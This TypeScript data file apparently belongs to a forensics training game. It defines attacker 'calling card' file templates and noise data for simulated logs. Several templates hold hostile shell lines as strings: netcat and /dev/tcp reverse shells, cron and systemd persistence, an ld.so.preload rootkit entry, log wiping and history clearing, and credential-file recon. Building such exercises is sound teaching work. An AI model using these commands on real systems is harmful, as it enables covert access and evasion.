import type { Difficulty } from '../types';

// --- Forensics Evidence Pools ---

export type ForensicsLogType = 'ssh' | 'ftp' | 'http';

export const forensicsLogTypes: readonly ForensicsLogType[] = ['ssh', 'ftp', 'http'];

export type ForensicsCallingCardTemplate = {
  readonly path: string;
  readonly content: string;
};

// Calling card templates — {{handle}} is replaced with the attacker's handle
export const forensicsCallingCardTemplates: readonly ForensicsCallingCardTemplate[] = [
  {
    path: '/tmp/.{{handle}}',
    content: '# {{handle}} was here\n# You will never catch me',
  },
  {
    path: '/opt/.backdoor.sh',
    content: '#!/bin/bash\n# {{handle}} — persistent access\nnc -e /bin/bash 0.0.0.0 31337 &',
  },
  {
    path: '/var/tmp/.{{handle}}.log',
    content: '[+] exfil complete — {{handle}}\n[+] credentials dumped\n[+] covering tracks...',
  },
  {
    path: '/etc/cron.d/.{{handle}}',
    content: '# {{handle}} — auto-reconnect\n*/5 * * * * root /tmp/.rev.sh 2>/dev/null',
  },
  {
    path: '/tmp/.session_{{handle}}',
    content: 'SESSION_ID={{handle}}\nTIMESTAMP=2026-03-20T02:45:00Z\nSTATUS=active\nEXFIL=complete',
  },
  {
    path: '/var/log/.cleanup_{{handle}}.sh',
    content: '#!/bin/bash\n# {{handle}} cleanup script\nrm -f /var/log/auth.log.bak\nhistory -c',
  },
  {
    path: '/tmp/.{{handle}}_exfil.tar.gz.part',
    content:
      '# partial upload — connection interrupted\n# agent: {{handle}}\n# target: /srv/data/\n# bytes_sent: 48291840',
  },
  {
    path: '/opt/.{{handle}}_pivot.conf',
    content:
      '# {{handle}} — pivot config\nLOCAL_PORT=4443\nREMOTE=10.0.0.1:22\nMODE=dynamic\nKEEPALIVE=60',
  },
  {
    path: '/etc/ld.so.preload',
    content: '# {{handle}} — LD_PRELOAD rootkit\n/tmp/.libs/libpam_hook.so',
  },
  {
    path: '/tmp/.{{handle}}_tools/recon.sh',
    content:
      '#!/bin/bash\n# {{handle}} recon toolkit\ncat /etc/passwd | grep -v nologin\nnetstat -tlnp\nps aux | grep -v grep\nfind / -perm -4000 2>/dev/null',
  },
  {
    path: '/var/tmp/.{{handle}}_keylog',
    content:
      '{{handle}} — keylogger dump\n[2026-03-20 02:48:12] tty1: su root\n[2026-03-20 02:48:14] tty1: ********\n[2026-03-20 02:49:01] tty1: cat /etc/shadow',
  },
  {
    path: '/root/.{{handle}}_note',
    content: 'Your security is a joke. — {{handle}}',
  },
  {
    path: '/tmp/.rev.sh',
    content:
      '#!/bin/bash\n# {{handle}} reverse shell\nwhile true; do\n  bash -i >& /dev/tcp/0.0.0.0/9001 0>&1\n  sleep 300\ndone',
  },
  {
    path: '/etc/systemd/system/.{{handle}}.service',
    content:
      '[Unit]\nDescription={{handle}} persistence\nAfter=network.target\n\n[Service]\nExecStart=/tmp/.rev.sh\nRestart=always\nRestartSec=60\n\n[Install]\nWantedBy=multi-user.target',
  },
  {
    path: '/var/spool/cron/crontabs/root',
    content:
      '# {{handle}} — persistence cron\n*/10 * * * * /tmp/.rev.sh >/dev/null 2>&1\n# original entries removed by attacker',
  },
];

// Noise IPs for red herring log entries (mix of internal and external)
export const forensicsNoiseIps: readonly string[] = [
  '10.0.0.1',
  '10.0.0.50',
  '192.168.1.100',
  '172.16.0.5',
  '8.8.8.8',
  '203.0.113.42',
  '198.51.100.7',
  '10.10.10.1',
  '172.16.10.25',
  '10.0.1.200',
  '192.168.0.1',
  '10.255.0.1',
  '198.51.100.200',
  '203.0.113.100',
  '172.20.0.10',
  '10.0.0.254',
];

// Common usernames for noise log entries
export const forensicsNoiseUsers: readonly string[] = [
  'admin',
  'sysadmin',
  'backup',
  'deploy',
  'monitor',
  'nagios',
  'www-data',
  'jenkins',
  'postgres',
  'mysql',
  'ansible',
  'git',
  'prometheus',
  'grafana',
  'ubuntu',
];

// Noise HTTP paths for red herring access.log entries
export const forensicsNoiseHttpPaths: readonly string[] = [
  '/api/health',
  '/api/status',
  '/login',
  '/dashboard',
  '/api/v1/metrics',
  '/favicon.ico',
  '/',
  '/robots.txt',
  '/admin/',
  '/wp-login.php',
  '/api/v1/users',
  '/assets/app.js',
  '/static/style.css',
  '/.well-known/security.txt',
  '/server-status',
  '/phpmyadmin/',
];

// Number of noise entries per difficulty
export const forensicsNoiseCount: Readonly<Record<Difficulty, readonly [number, number]>> = {
  easy: [1, 2],
  medium: [3, 5],
  hard: [5, 8],
};
